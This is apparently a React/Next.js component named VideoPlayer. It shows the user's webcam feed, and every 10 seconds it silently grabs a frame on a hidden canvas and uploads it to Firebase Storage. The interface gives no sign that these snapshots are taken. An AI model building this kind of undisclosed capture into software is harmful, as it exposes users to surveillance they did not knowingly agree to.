"use client";
import { useEffect, useRef, useState } from "react";
import { getStorage, ref, uploadBytes } from "firebase/storage";
import { app } from "../../lib/firebase"; // adjust if your firebase config is elsewhere

export default function VideoPlayer() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [error, setError] = useState("");

  useEffect(() => {
    async function setupCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
        }
      } catch (err) {
        console.error("Error accessing webcam:", err);
        setError("Please allow camera access to continue.");
      }
    }

    setupCamera();
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      if (!videoRef.current || !canvasRef.current) return;

      const video = videoRef.current;
      const canvas = canvasRef.current;
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const ctx = canvas.getContext("2d");
      if (ctx) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(async (blob) => {
          if (!blob) return;

          const storage = getStorage(app);
          const imageRef = ref(storage, `screenshots/snap-${Date.now()}.jpg`);

          try {
            await uploadBytes(imageRef, blob);
            console.log("Uploaded screenshot!");
          } catch (uploadErr) {
            console.error("Upload error:", uploadErr);
          }
        }, "image/jpeg");
      }
    }, 10000); // every 10 seconds

    return () => clearInterval(interval);
  }, []);

  return (
    <div className="w-full h-[60%] bg-black rounded-lg mb-4 flex items-center justify-center">
      {error ? (
        <p className="text-white text-sm">{error}</p>
      ) : (
        <>
          <video ref={videoRef} autoPlay playsInline className="w-full h-full rounded-lg" />
          <canvas ref={canvasRef} style={{ display: "none" }} />
        </>
      )}
    </div>
  );
}
